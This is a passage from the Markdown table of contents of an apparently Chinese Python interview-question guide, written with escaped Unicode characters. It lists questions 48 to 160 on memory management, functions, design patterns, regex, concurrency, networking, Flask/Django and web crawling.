[47.Python\u4e2d\u5982\u4f55\u52a8\u6001\u83b7\u53d6\u548c\u8bbe\u7f6e\u5bf9\u8c61\u7684\u5c5e\u6027\uff1f](#47python\u4e2d\u5982\u4f55\u52a8\u6001\u83b7\u53d6\u548c\u8bbe\u7f6e\u5bf9\u8c61\u7684\u5c5e\u6027)\n    - [\u5185\u5b58\u7ba1\u7406\u4e0e\u5783\u573e\u56de\u6536\u673a\u5236](#\u5185\u5b58\u7ba1\u7406\u4e0e\u5783\u573e\u56de\u6536\u673a\u5236)\n        - [48.\u54ea\u4e9b\u64cd\u4f5c\u4f1a\u5bfc\u81f4Python\u5185\u5b58\u6ea2\u51fa\uff0c\u600e\u4e48\u5904\u7406\uff1f](#48\u54ea\u4e9b\u64cd\u4f5c\u4f1a\u5bfc\u81f4python\u5185\u5b58\u6ea2\u51fa\u600e\u4e48\u5904\u7406)\n        - [49.\u5173\u4e8ePython\u5185\u5b58\u7ba1\u7406,\u4e0b\u5217\u8bf4\u6cd5\u9519\u8bef\u7684\u662f  B](#49\u5173\u4e8epython\u5185\u5b58\u7ba1\u7406\u4e0b\u5217\u8bf4\u6cd5\u9519\u8bef\u7684\u662f--b)\n        - [50.Python\u7684\u5185\u5b58\u7ba1\u7406\u673a\u5236\u53ca\u8c03\u4f18\u624b\u6bb5\uff1f](#50python\u7684\u5185\u5b58\u7ba1\u7406\u673a\u5236\u53ca\u8c03\u4f18\u624b\u6bb5)\n        - [51.\u5185\u5b58\u6cc4\u9732\u662f\u4ec0\u4e48\uff1f\u5982\u4f55\u907f\u514d\uff1f](#51\u5185\u5b58\u6cc4\u9732\u662f\u4ec0\u4e48\u5982\u4f55\u907f\u514d)\n    - [\u51fd\u6570](#\u51fd\u6570)\n        - [52.python\u5e38\u89c1\u7684\u5217\u8868\u63a8\u5bfc\u5f0f\uff1f](#52python\u5e38\u89c1\u7684\u5217\u8868\u63a8\u5bfc\u5f0f)\n        - [53.\u7b80\u8ff0read\u3001readline\u3001readlines\u7684\u533a\u522b\uff1f](#53\u7b80\u8ff0readreadlinereadlines\u7684\u533a\u522b)\n        - [54.\u4ec0\u4e48\u662fHash\uff08\u6563\u5217\u51fd\u6570\uff09\uff1f](#54\u4ec0\u4e48\u662fhash\u6563\u5217\u51fd\u6570)\n        - [55.python\u51fd\u6570\u91cd\u8f7d\u673a\u5236\uff1f](#55python\u51fd\u6570\u91cd\u8f7d\u673a\u5236)\n        - [56.\u5199\u4e00\u4e2a\u51fd\u6570\u627e\u51fa\u4e00\u4e2a\u6574\u6570\u6570\u7ec4\u4e2d\uff0c\u7b2c\u4e8c\u5927\u7684\u6570](#56\u5199\u4e00\u4e2a\u51fd\u6570\u627e\u51fa\u4e00\u4e2a\u6574\u6570\u6570\u7ec4\u4e2d\u7b2c\u4e8c\u5927\u7684\u6570)\n        - [57.\u624b\u5199\u4e00\u4e2a\u5224\u65ad\u65f6\u95f4\u7684\u88c5\u9970\u5668](#57\u624b\u5199\u4e00\u4e2a\u5224\u65ad\u65f6\u95f4\u7684\u88c5\u9970\u5668)\n        - [58.\u4f7f\u7528Python\u5185\u7f6e\u7684filter()\u65b9\u6cd5\u6765\u8fc7\u6ee4\uff1f](#58\u4f7f\u7528python\u5185\u7f6e\u7684filter\u65b9\u6cd5\u6765\u8fc7\u6ee4)\n        - [59.\u7f16\u5199\u51fd\u6570\u76844\u4e2a\u539f\u5219](#59\u7f16\u5199\u51fd\u6570\u76844\u4e2a\u539f\u5219)\n        - [60.\u51fd\u6570\u8c03\u7528\u53c2\u6570\u7684\u4f20\u9012\u65b9\u5f0f\u662f\u503c\u4f20\u9012\u8fd8\u662f\u5f15\u7528\u4f20\u9012\uff1f](#60\u51fd\u6570\u8c03\u7528\u53c2\u6570\u7684\u4f20\u9012\u65b9\u5f0f\u662f\u503c\u4f20\u9012\u8fd8\u662f\u5f15\u7528\u4f20\u9012)\n        - [61.\u5982\u4f55\u5728function\u91cc\u9762\u8bbe\u7f6e\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf](#61\u5982\u4f55\u5728function\u91cc\u9762\u8bbe\u7f6e\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf)\n        - [62.\u5bf9\u7f3a\u7701\u53c2\u6570\u7684\u7406\u89e3 \uff1f](#62\u5bf9\u7f3a\u7701\u53c2\u6570\u7684\u7406\u89e3-)\n        - [63.Mysql\u600e\u4e48\u9650\u5236IP\u8bbf\u95ee\uff1f](#63mysql\u600e\u4e48\u9650\u5236ip\u8bbf\u95ee)\n        - [64.\u5e26\u53c2\u6570\u7684\u88c5\u9970\u5668?](#64\u5e26\u53c2\u6570\u7684\u88c5\u9970\u5668)\n        - [65.\u4e3a\u4ec0\u4e48\u51fd\u6570\u540d\u5b57\u53ef\u4ee5\u5f53\u505a\u53c2\u6570\u7528?](#65\u4e3a\u4ec0\u4e48\u51fd\u6570\u540d\u5b57\u53ef\u4ee5\u5f53\u505a\u53c2\u6570\u7528)\n        - [66.Python\u4e2dpass\u8bed\u53e5\u7684\u4f5c\u7528\u662f\u4ec0\u4e48\uff1f](#66python\u4e2dpass\u8bed\u53e5\u7684\u4f5c\u7528\u662f\u4ec0\u4e48)\n        - [67.\u6709\u8fd9\u6837\u4e00\u6bb5\u4ee3\u7801\uff0cprint c\u4f1a\u8f93\u51fa\u4ec0\u4e48\uff0c\u4e3a\u4ec0\u4e48\uff1f](#67\u6709\u8fd9\u6837\u4e00\u6bb5\u4ee3\u7801print-c\u4f1a\u8f93\u51fa\u4ec0\u4e48\u4e3a\u4ec0\u4e48)\n        - [68.\u4ea4\u6362\u4e24\u4e2a\u53d8\u91cf\u7684\u503c\uff1f](#68\u4ea4\u6362\u4e24\u4e2a\u53d8\u91cf\u7684\u503c)\n        - [69.map\u51fd\u6570\u548creduce\u51fd\u6570\uff1f](#69map\u51fd\u6570\u548creduce\u51fd\u6570)\n        - [70.\u56de\u8c03\u51fd\u6570\uff0c\u5982\u4f55\u901a\u4fe1\u7684?](#70\u56de\u8c03\u51fd\u6570\u5982\u4f55\u901a\u4fe1\u7684)\n        - [71.Python\u4e3b\u8981\u7684\u5185\u7f6e\u6570\u636e\u7c7b\u578b\u90fd\u6709\u54ea\u4e9b\uff1f print dir( \u2018a \u2019) \u7684\u8f93\u51fa\uff1f](#71python\u4e3b\u8981\u7684\u5185\u7f6e\u6570\u636e\u7c7b\u578b\u90fd\u6709\u54ea\u4e9b-print-dir-a--\u7684\u8f93\u51fa)\n        - [72.map(lambda x:xx\uff0c[y for y in range(3)])\u7684\u8f93\u51fa\uff1f](#72maplambda-xxxy-for-y-in-range3\u7684\u8f93\u51fa)\n        - [73.hasattr() getattr() setattr() \u51fd\u6570\u4f7f\u7528\u8be6\u89e3\uff1f](#73hasattr-getattr-setattr-\u51fd\u6570\u4f7f\u7528\u8be6\u89e3)\n        - [74.\u4e00\u53e5\u8bdd\u89e3\u51b3\u9636\u4e58\u51fd\u6570\uff1f](#74\u4e00\u53e5\u8bdd\u89e3\u51b3\u9636\u4e58\u51fd\u6570)\n        - [75.\u4ec0\u4e48\u662flambda\u51fd\u6570\uff1f \u6709\u4ec0\u4e48\u597d\u5904\uff1f](#75\u4ec0\u4e48\u662flambda\u51fd\u6570-\u6709\u4ec0\u4e48\u597d\u5904)\n        - [76.\u9012\u5f52\u51fd\u6570\u505c\u6b62\u7684\u6761\u4ef6\uff1f](#76\u9012\u5f52\u51fd\u6570\u505c\u6b62\u7684\u6761\u4ef6)\n        - [77.\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u7684\u8f93\u51fa\u7ed3\u679c\u5c06\u662f\u4ec0\u4e48\uff1f\u8bf7\u89e3\u91ca\u3002](#77\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u7684\u8f93\u51fa\u7ed3\u679c\u5c06\u662f\u4ec0\u4e48\u8bf7\u89e3\u91ca)\n        - [78.\u4ec0\u4e48\u662flambda\u51fd\u6570\uff1f\u5b83\u6709\u4ec0\u4e48\u597d\u5904\uff1f\u5199\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u6c42\u4e24\u4e2a\u6570\u7684\u548c](#78\u4ec0\u4e48\u662flambda\u51fd\u6570\u5b83\u6709\u4ec0\u4e48\u597d\u5904\u5199\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u6c42\u4e24\u4e2a\u6570\u7684\u548c)\n    - [\u8bbe\u8ba1\u6a21\u5f0f](#\u8bbe\u8ba1\u6a21\u5f0f)\n        - [79.\u5bf9\u8bbe\u8ba1\u6a21\u5f0f\u7684\u7406\u89e3\uff0c\u7b80\u8ff0\u4f60\u4e86\u89e3\u7684\u8bbe\u8ba1\u6a21\u5f0f\uff1f](#79\u5bf9\u8bbe\u8ba1\u6a21\u5f0f\u7684\u7406\u89e3\u7b80\u8ff0\u4f60\u4e86\u89e3\u7684\u8bbe\u8ba1\u6a21\u5f0f)\n        - [80.\u8bf7\u624b\u5199\u4e00\u4e2a\u5355\u4f8b](#80\u8bf7\u624b\u5199\u4e00\u4e2a\u5355\u4f8b)\n        - [81.\u5355\u4f8b\u6a21\u5f0f\u7684\u5e94\u7528\u573a\u666f\u6709\u90a3\u4e9b\uff1f](#81\u5355\u4f8b\u6a21\u5f0f\u7684\u5e94\u7528\u573a\u666f\u6709\u90a3\u4e9b)\n        - [82.\u7528\u4e00\u884c\u4ee3\u7801\u751f\u6210[1,4,9,16,25,36,49,64,81,100]](#82\u7528\u4e00\u884c\u4ee3\u7801\u751f\u6210149162536496481100)\n        - [83.\u5bf9\u88c5\u9970\u5668\u7684\u7406\u89e3\uff0c\u5e76\u5199\u51fa\u4e00\u4e2a\u8ba1\u65f6\u5668\u8bb0\u5f55\u65b9\u6cd5\u6267\u884c\u6027\u80fd\u7684\u88c5\u9970\u5668\uff1f](#83\u5bf9\u88c5\u9970\u5668\u7684\u7406\u89e3\u5e76\u5199\u51fa\u4e00\u4e2a\u8ba1\u65f6\u5668\u8bb0\u5f55\u65b9\u6cd5\u6267\u884c\u6027\u80fd\u7684\u88c5\u9970\u5668)\n        - [84.\u89e3\u91ca\u4ee5\u4e0b\u4ec0\u4e48\u662f\u95ed\u5305\uff1f](#84\u89e3\u91ca\u4ee5\u4e0b\u4ec0\u4e48\u662f\u95ed\u5305)\n        - [85.\u51fd\u6570\u88c5\u9970\u5668\u6709\u4ec0\u4e48\u4f5c\u7528\uff1f](#85\u51fd\u6570\u88c5\u9970\u5668\u6709\u4ec0\u4e48\u4f5c\u7528)\n        - [86.\u751f\u6210\u5668\uff0c\u8fed\u4ee3\u5668\u7684\u533a\u522b\uff1f](#86\u751f\u6210\u5668\u8fed\u4ee3\u5668\u7684\u533a\u522b)\n        - [87.X\u662f\u4ec0\u4e48\u7c7b\u578b?](#87x\u662f\u4ec0\u4e48\u7c7b\u578b)\n        - [88.\u8bf7\u7528\u4e00\u884c\u4ee3\u7801 \u5b9e\u73b0\u5c061-N \u7684\u6574\u6570\u5217\u8868\u4ee53\u4e3a\u5355\u4f4d\u5206\u7ec4](#88\u8bf7\u7528\u4e00\u884c\u4ee3\u7801-\u5b9e\u73b0\u5c061-n-\u7684\u6574\u6570\u5217\u8868\u4ee53\u4e3a\u5355\u4f4d\u5206\u7ec4)\n        - [89.Python\u4e2dyield\u7684\u7528\u6cd5?](#89python\u4e2dyield\u7684\u7528\u6cd5)\n    - [\u9762\u5411\u5bf9\u8c61](#\u9762\u5411\u5bf9\u8c61)\n        - [90.Python\u4e2d\u7684\u53ef\u53d8\u5bf9\u8c61\u548c\u4e0d\u53ef\u53d8\u5bf9\u8c61\uff1f](#90python\u4e2d\u7684\u53ef\u53d8\u5bf9\u8c61\u548c\u4e0d\u53ef\u53d8\u5bf9\u8c61)\n        - [91.Python\u7684\u9b54\u6cd5\u65b9\u6cd5](#91python\u7684\u9b54\u6cd5\u65b9\u6cd5)\n        - [92.\u9762\u5411\u5bf9\u8c61\u4e2d\u600e\u4e48\u5b9e\u73b0\u53ea\u8bfb\u5c5e\u6027?](#92\u9762\u5411\u5bf9\u8c61\u4e2d\u600e\u4e48\u5b9e\u73b0\u53ea\u8bfb\u5c5e\u6027)\n        - [93.\u8c08\u8c08\u4f60\u5bf9\u9762\u5411\u5bf9\u8c61\u7684\u7406\u89e3\uff1f](#93\u8c08\u8c08\u4f60\u5bf9\u9762\u5411\u5bf9\u8c61\u7684\u7406\u89e3)\n    - [\u6b63\u5219\u8868\u8fbe\u5f0f](#\u6b63\u5219\u8868\u8fbe\u5f0f)\n        - [94.\u8bf7\u5199\u51fa\u4e00\u6bb5\u4ee3\u7801\u7528\u6b63\u5219\u5339\u914d\u51faip\uff1f](#94\u8bf7\u5199\u51fa\u4e00\u6bb5\u4ee3\u7801\u7528\u6b63\u5219\u5339\u914d\u51faip)\n        - [95.a = \u201cabbbccc\u201d\uff0c\u7528\u6b63\u5219\u5339\u914d\u4e3aabccc,\u4e0d\u7ba1\u6709\u591a\u5c11b\uff0c\u5c31\u51fa\u73b0\u4e00\u6b21\uff1f](#95a--abbbccc\u7528\u6b63\u5219\u5339\u914d\u4e3aabccc\u4e0d\u7ba1\u6709\u591a\u5c11b\u5c31\u51fa\u73b0\u4e00\u6b21)\n        - [96.Python\u5b57\u7b26\u4e32\u67e5\u627e\u548c\u66ff\u6362\uff1f](#96python\u5b57\u7b26\u4e32\u67e5\u627e\u548c\u66ff\u6362)\n        - [97.\u7528Python\u5339\u914dHTML g tag\u7684\u65f6\u5019\uff0c<.> \u548c <.*?> \u6709\u4ec0\u4e48\u533a\u522b](#97\u7528python\u5339\u914dhtml-g-tag\u7684\u65f6\u5019-\u548c--\u6709\u4ec0\u4e48\u533a\u522b)\n        - [98.\u6b63\u5219\u8868\u8fbe\u5f0f\u8d2a\u5a6a\u4e0e\u975e\u8d2a\u5a6a\u6a21\u5f0f\u7684\u533a\u522b\uff1f](#98\u6b63\u5219\u8868\u8fbe\u5f0f\u8d2a\u5a6a\u4e0e\u975e\u8d2a\u5a6a\u6a21\u5f0f\u7684\u533a\u522b)\n        - [99.\u5199\u51fa\u5f00\u5934\u5339\u914d\u5b57\u6bcd\u548c\u4e0b\u5212\u7ebf\uff0c\u672b\u5c3e\u662f\u6570\u5b57\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\uff1f](#99\u5199\u51fa\u5f00\u5934\u5339\u914d\u5b57\u6bcd\u548c\u4e0b\u5212\u7ebf\u672b\u5c3e\u662f\u6570\u5b57\u7684\u6b63\u5219\u8868\u8fbe\u5f0f)\n        - [100.\u6b63\u5219\u8868\u8fbe\u5f0f\u64cd\u4f5c](#100\u6b63\u5219\u8868\u8fbe\u5f0f\u64cd\u4f5c)\n        - [101.\u8bf7\u5339\u914d\u51fa\u53d8\u91cfA \u4e2d\u7684json\u5b57\u7b26\u4e32\u3002](#101\u8bf7\u5339\u914d\u51fa\u53d8\u91cfa-\u4e2d\u7684json\u5b57\u7b26\u4e32)\n        - [102.\u600e\u4e48\u8fc7\u6ee4\u8bc4\u8bba\u4e2d\u7684\u8868\u60c5\uff1f](#102\u600e\u4e48\u8fc7\u6ee4\u8bc4\u8bba\u4e2d\u7684\u8868\u60c5)\n        - [103.\u7b80\u8ff0Python\u91cc\u9762search\u548cmatch\u7684\u533a\u522b](#103\u7b80\u8ff0python\u91cc\u9762search\u548cmatch\u7684\u533a\u522b)\n        - [104.\u8bf7\u5199\u51fa\u5339\u914dip\u7684Python\u6b63\u5219\u8868\u8fbe\u5f0f](#104\u8bf7\u5199\u51fa\u5339\u914dip\u7684python\u6b63\u5219\u8868\u8fbe\u5f0f)\n        - [105.Python\u91ccmatch\u4e0esearch\u7684\u533a\u522b\uff1f](#105python\u91ccmatch\u4e0esearch\u7684\u533a\u522b)\n    - [\u7cfb\u7edf\u7f16\u7a0b](#\u7cfb\u7edf\u7f16\u7a0b)\n        - [106.\u8fdb\u7a0b\u603b\u7ed3](#106\u8fdb\u7a0b\u603b\u7ed3)\n        - [107.\u8c08\u8c08\u4f60\u5bf9\u591a\u8fdb\u7a0b\uff0c\u591a\u7ebf\u7a0b\uff0c\u4ee5\u53ca\u534f\u7a0b\u7684\u7406\u89e3\uff0c\u9879\u76ee\u662f\u5426\u7528\uff1f](#107\u8c08\u8c08\u4f60\u5bf9\u591a\u8fdb\u7a0b\u591a\u7ebf\u7a0b\u4ee5\u53ca\u534f\u7a0b\u7684\u7406\u89e3\u9879\u76ee\u662f\u5426\u7528)\n        - [108.Python\u5f02\u5e38\u4f7f\u7528\u573a\u666f\u6709\u90a3\u4e9b\uff1f](#108python\u5f02\u5e38\u4f7f\u7528\u573a\u666f\u6709\u90a3\u4e9b)\n        - [109.\u591a\u7ebf\u7a0b\u5171\u540c\u64cd\u4f5c\u540c\u4e00\u4e2a\u6570\u636e\u4e92\u65a5\u9501\u540c\u6b65\uff1f](#109\u591a\u7ebf\u7a0b\u5171\u540c\u64cd\u4f5c\u540c\u4e00\u4e2a\u6570\u636e\u4e92\u65a5\u9501\u540c\u6b65)\n        - [110.\u4ec0\u4e48\u662f\u591a\u7ebf\u7a0b\u7ade\u4e89\uff1f](#110\u4ec0\u4e48\u662f\u591a\u7ebf\u7a0b\u7ade\u4e89)\n        - [111.\u8bf7\u4ecb\u7ecd\u4e00\u4e0bPython\u7684\u7ebf\u7a0b\u540c\u6b65\uff1f](#111\u8bf7\u4ecb\u7ecd\u4e00\u4e0bpython\u7684\u7ebf\u7a0b\u540c\u6b65)\n        - [112.\u89e3\u91ca\u4ee5\u4e0b\u4ec0\u4e48\u662f\u9501\uff0c\u6709\u54ea\u51e0\u79cd\u9501\uff1f](#112\u89e3\u91ca\u4ee5\u4e0b\u4ec0\u4e48\u662f\u9501\u6709\u54ea\u51e0\u79cd\u9501)\n        - [113.\u4ec0\u4e48\u662f\u6b7b\u9501\uff1f](#113\u4ec0\u4e48\u662f\u6b7b\u9501)\n        - [114.\u591a\u7ebf\u7a0b\u4ea4\u4e92\u8bbf\u95ee\u6570\u636e\uff0c\u5982\u679c\u8bbf\u95ee\u5230\u4e86\u5c31\u4e0d\u8bbf\u95ee\u4e86\uff1f](#114\u591a\u7ebf\u7a0b\u4ea4\u4e92\u8bbf\u95ee\u6570\u636e\u5982\u679c\u8bbf\u95ee\u5230\u4e86\u5c31\u4e0d\u8bbf\u95ee\u4e86)\n        - [115.\u4ec0\u4e48\u662f\u7ebf\u7a0b\u5b89\u5168\uff0c\u4ec0\u4e48\u662f\u4e92\u65a5\u9501\uff1f](#115\u4ec0\u4e48\u662f\u7ebf\u7a0b\u5b89\u5168\u4ec0\u4e48\u662f\u4e92\u65a5\u9501)\n        - [116.\u8bf4\u8bf4\u4e0b\u9762\u51e0\u4e2a\u6982\u5ff5\uff1a\u540c\u6b65\uff0c\u5f02\u6b65\uff0c\u963b\u585e\uff0c\u975e\u963b\u585e\uff1f](#116\u8bf4\u8bf4\u4e0b\u9762\u51e0\u4e2a\u6982\u5ff5\u540c\u6b65\u5f02\u6b65\u963b\u585e\u975e\u963b\u585e)\n        - [117.\u4ec0\u4e48\u662f\u50f5\u5c38\u8fdb\u7a0b\u548c\u5b64\u513f\u8fdb\u7a0b\uff1f\u600e\u4e48\u907f\u514d\u50f5\u5c38\u8fdb\u7a0b\uff1f](#117\u4ec0\u4e48\u662f\u50f5\u5c38\u8fdb\u7a0b\u548c\u5b64\u513f\u8fdb\u7a0b\u600e\u4e48\u907f\u514d\u50f5\u5c38\u8fdb\u7a0b)\n        - [118.python\u4e2d\u8fdb\u7a0b\u4e0e\u7ebf\u7a0b\u7684\u4f7f\u7528\u573a\u666f\uff1f](#118python\u4e2d\u8fdb\u7a0b\u4e0e\u7ebf\u7a0b\u7684\u4f7f\u7528\u573a\u666f)\n        - [119.\u7ebf\u7a0b\u662f\u5e76\u53d1\u8fd8\u662f\u5e76\u884c\uff0c\u8fdb\u7a0b\u662f\u5e76\u53d1\u8fd8\u662f\u5e76\u884c\uff1f](#119\u7ebf\u7a0b\u662f\u5e76\u53d1\u8fd8\u662f\u5e76\u884c\u8fdb\u7a0b\u662f\u5e76\u53d1\u8fd8\u662f\u5e76\u884c)\n        - [120.\u5e76\u884c(parallel)\u548c\u5e76\u53d1\uff08concurrency)?](#120\u5e76\u884cparallel\u548c\u5e76\u53d1concurrency)\n        - [121.IO\u5bc6\u96c6\u578b\u548cCPU\u5bc6\u96c6\u578b\u533a\u522b\uff1f](#121io\u5bc6\u96c6\u578b\u548ccpu\u5bc6\u96c6\u578b\u533a\u522b)\n        - [122.python asyncio\u7684\u539f\u7406\uff1f](#122python-asyncio\u7684\u539f\u7406)\n    - [\u7f51\u7edc\u7f16\u7a0b](#\u7f51\u7edc\u7f16\u7a0b)\n        - [123.\u600e\u4e48\u5b9e\u73b0\u5f3a\u884c\u5173\u95ed\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u8fde\u63a5?](#123\u600e\u4e48\u5b9e\u73b0\u5f3a\u884c\u5173\u95ed\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u8fde\u63a5)\n        - [124.\u7b80\u8ff0TCP\u548cUDP\u7684\u533a\u522b\u4ee5\u53ca\u4f18\u7f3a\u70b9?](#124\u7b80\u8ff0tcp\u548cudp\u7684\u533a\u522b\u4ee5\u53ca\u4f18\u7f3a\u70b9)\n        - [125.\u7b80\u8ff0\u6d4f\u89c8\u5668\u901a\u8fc7WSGI\u8bf7\u6c42\u52a8\u6001\u8d44\u6e90\u7684\u8fc7\u7a0b?](#125\u7b80\u8ff0\u6d4f\u89c8\u5668\u901a\u8fc7wsgi\u8bf7\u6c42\u52a8\u6001\u8d44\u6e90\u7684\u8fc7\u7a0b)\n        - [126.\u63cf\u8ff0\u7528\u6d4f\u89c8\u5668\u8bbf\u95eewww.baidu.com\u7684\u8fc7\u7a0b](#126\u63cf\u8ff0\u7528\u6d4f\u89c8\u5668\u8bbf\u95eewwwbaiducom\u7684\u8fc7\u7a0b)\n        - [127.Post\u548cGet\u8bf7\u6c42\u7684\u533a\u522b?](#127post\u548cget\u8bf7\u6c42\u7684\u533a\u522b)\n        - [128.cookie \u548csession \u7684\u533a\u522b\uff1f](#128cookie-\u548csession-\u7684\u533a\u522b)\n        - [129.\u5217\u51fa\u4f60\u77e5\u9053\u7684HTTP\u534f\u8bae\u7684\u72b6\u6001\u7801\uff0c\u8bf4\u51fa\u8868\u793a\u4ec0\u4e48\u610f\u601d\uff1f](#129\u5217\u51fa\u4f60\u77e5\u9053\u7684http\u534f\u8bae\u7684\u72b6\u6001\u7801\u8bf4\u51fa\u8868\u793a\u4ec0\u4e48\u610f\u601d)\n        - [130.\u8bf7\u7b80\u5355\u8bf4\u4e00\u4e0b\u4e09\u6b21\u63e1\u624b\u548c\u56db\u6b21\u6325\u624b\uff1f](#130\u8bf7\u7b80\u5355\u8bf4\u4e00\u4e0b\u4e09\u6b21\u63e1\u624b\u548c\u56db\u6b21\u6325\u624b)\n        - [131.\u8bf4\u4e00\u4e0b\u4ec0\u4e48\u662ftcp\u76842MSL\uff1f](#131\u8bf4\u4e00\u4e0b\u4ec0\u4e48\u662ftcp\u76842msl)\n        - [132.\u4e3a\u4ec0\u4e48\u5ba2\u6237\u7aef\u5728TIME-WAIT\u72b6\u6001\u5fc5\u987b\u7b49\u5f852MSL\u7684\u65f6\u95f4\uff1f](#132\u4e3a\u4ec0\u4e48\u5ba2\u6237\u7aef\u5728time-wait\u72b6\u6001\u5fc5\u987b\u7b49\u5f852msl\u7684\u65f6\u95f4)\n        - [133.\u8bf4\u8bf4HTTP\u548cHTTPS\u533a\u522b\uff1f](#133\u8bf4\u8bf4http\u548chttps\u533a\u522b)\n        - [134.\u8c08\u4e00\u4e0bHTTP\u534f\u8bae\u4ee5\u53ca\u534f\u8bae\u5934\u90e8\u4e2d\u8868\u793a\u6570\u636e\u7c7b\u578b\u7684\u5b57\u6bb5\uff1f](#134\u8c08\u4e00\u4e0bhttp\u534f\u8bae\u4ee5\u53ca\u534f\u8bae\u5934\u90e8\u4e2d\u8868\u793a\u6570\u636e\u7c7b\u578b\u7684\u5b57\u6bb5)\n        - [135.HTTP\u8bf7\u6c42\u65b9\u6cd5\u90fd\u6709\u4ec0\u4e48\uff1f](#135http\u8bf7\u6c42\u65b9\u6cd5\u90fd\u6709\u4ec0\u4e48)\n        - [136.\u4f7f\u7528Socket\u5957\u63a5\u5b57\u9700\u8981\u4f20\u5165\u54ea\u4e9b\u53c2\u6570 \uff1f](#136\u4f7f\u7528socket\u5957\u63a5\u5b57\u9700\u8981\u4f20\u5165\u54ea\u4e9b\u53c2\u6570-)\n        - [137.HTTP\u5e38\u89c1\u8bf7\u6c42\u5934\uff1f](#137http\u5e38\u89c1\u8bf7\u6c42\u5934)\n        - [138.\u4e03\u5c42\u6a21\u578b\uff1f](#138\u4e03\u5c42\u6a21\u578b)\n        - [139.url\u7684\u5f62\u5f0f\uff1f](#139url\u7684\u5f62\u5f0f)\n- [Web](#web)\n    - [Flask](#flask)\n        - [140.\u5bf9Flask\u84dd\u56fe(Blueprint)\u7684\u7406\u89e3\uff1f](#140\u5bf9flask\u84dd\u56feblueprint\u7684\u7406\u89e3)\n        - [141.Flask \u548c Django \u8def\u7531\u6620\u5c04\u7684\u533a\u522b\uff1f](#141flask-\u548c-django-\u8def\u7531\u6620\u5c04\u7684\u533a\u522b)\n    - [Django](#django)\n        - [142.\u4ec0\u4e48\u662fwsgi,uwsgi,uWSGI?](#142\u4ec0\u4e48\u662fwsgiuwsgiuwsgi)\n        - [143.Django\u3001Flask\u3001Tornado\u7684\u5bf9\u6bd4\uff1f](#143djangoflasktornado\u7684\u5bf9\u6bd4)\n        - [144.CORS \u548c CSRF\u7684\u533a\u522b\uff1f](#144cors-\u548c-csrf\u7684\u533a\u522b)\n        - [145.Session,Cookie,JWT\u7684\u7406\u89e3](#145sessioncookiejwt\u7684\u7406\u89e3)\n        - [146.\u7b80\u8ff0Django\u8bf7\u6c42\u751f\u547d\u5468\u671f](#146\u7b80\u8ff0django\u8bf7\u6c42\u751f\u547d\u5468\u671f)\n        - [147.\u7528\u7684restframework\u5b8c\u6210api\u53d1\u9001\u65f6\u95f4\u65f6\u533a](#147\u7528\u7684restframework\u5b8c\u6210api\u53d1\u9001\u65f6\u95f4\u65f6\u533a)\n        - [148.nginx,tomcat,apach\u5230\u90fd\u662f\u4ec0\u4e48\uff1f](#148nginxtomcatapach\u5230\u90fd\u662f\u4ec0\u4e48)\n        - [149.\u8bf7\u7ed9\u51fa\u4f60\u719f\u6089\u5173\u7cfb\u6570\u636e\u5e93\u8303\u5f0f\u6709\u54ea\u4e9b\uff0c\u6709\u4ec0\u4e48\u4f5c\u7528\uff1f](#149\u8bf7\u7ed9\u51fa\u4f60\u719f\u6089\u5173\u7cfb\u6570\u636e\u5e93\u8303\u5f0f\u6709\u54ea\u4e9b\u6709\u4ec0\u4e48\u4f5c\u7528)\n        - [150.\u7b80\u8ff0QQ\u767b\u9646\u8fc7\u7a0b](#150\u7b80\u8ff0qq\u767b\u9646\u8fc7\u7a0b)\n        - [151.post \u548c get\u7684\u533a\u522b?](#151post-\u548c-get\u7684\u533a\u522b)\n        - [152.\u9879\u76ee\u4e2d\u65e5\u5fd7\u7684\u4f5c\u7528](#152\u9879\u76ee\u4e2d\u65e5\u5fd7\u7684\u4f5c\u7528)\n        - [153.django\u4e2d\u95f4\u4ef6\u7684\u4f7f\u7528\uff1f](#153django\u4e2d\u95f4\u4ef6\u7684\u4f7f\u7528)\n        - [154.\u8c08\u4e00\u4e0b\u4f60\u5bf9uWSGI\u548cnginx\u7684\u7406\u89e3\uff1f](#154\u8c08\u4e00\u4e0b\u4f60\u5bf9uwsgi\u548cnginx\u7684\u7406\u89e3)\n        - [155.Python\u4e2d\u4e09\u5927\u6846\u67b6\u5404\u81ea\u7684\u5e94\u7528\u573a\u666f\uff1f](#155python\u4e2d\u4e09\u5927\u6846\u67b6\u5404\u81ea\u7684\u5e94\u7528\u573a\u666f)\n        - [156.Django\u4e2d\u54ea\u91cc\u7528\u5230\u4e86\u7ebf\u7a0b\uff1f\u54ea\u91cc\u7528\u5230\u4e86\u534f\u7a0b\uff1f\u54ea\u91cc\u7528\u5230\u4e86\u8fdb\u7a0b\uff1f](#156django\u4e2d\u54ea\u91cc\u7528\u5230\u4e86\u7ebf\u7a0b\u54ea\u91cc\u7528\u5230\u4e86\u534f\u7a0b\u54ea\u91cc\u7528\u5230\u4e86\u8fdb\u7a0b)\n        - [157.\u6709\u7528\u8fc7Django REST framework\u5417\uff1f](#157\u6709\u7528\u8fc7django-rest-framework\u5417)\n        - [158.\u5bf9cookies\u4e0esession\u7684\u4e86\u89e3\uff1f\u4ed6\u4eec\u80fd\u5355\u72ec\u7528\u5417\uff1f](#158\u5bf9cookies\u4e0esession\u7684\u4e86\u89e3\u4ed6\u4eec\u80fd\u5355\u72ec\u7528\u5417)\n    - [\u722c\u866b](#\u722c\u866b)\n        - [159.\u8bd5\u5217\u51fa\u81f3\u5c11\u4e09\u79cd\u76ee\u524d\u6d41\u884c\u7684\u5927\u578b\u6570\u636e\u5e93](#159\u8bd5\u5217\u51fa\u81f3\u5c11\u4e09\u79cd\u76ee\u524d\u6d41\u884c\u7684\u5927\u578b\u6570\u636e\u5e93)\n        - [160.\u5217\u4e3e\u60a8\u4f7f\u7528\u8fc7\u7684Python\u7f51\u7edc\u722c\u866b\u6240\u7528\u5230\u7684\u7f51\u7edc\u6570\u636e\u5305?](#160\u5217\u4e3e\u60a8\u4f7f\u7528\u8fc7\u7684python\u7f51\u7edc\u722c\u866b\u6240\u7528\u5230\u7684\u7f51\u7edc\u6570\u636e\u5305)\n        - 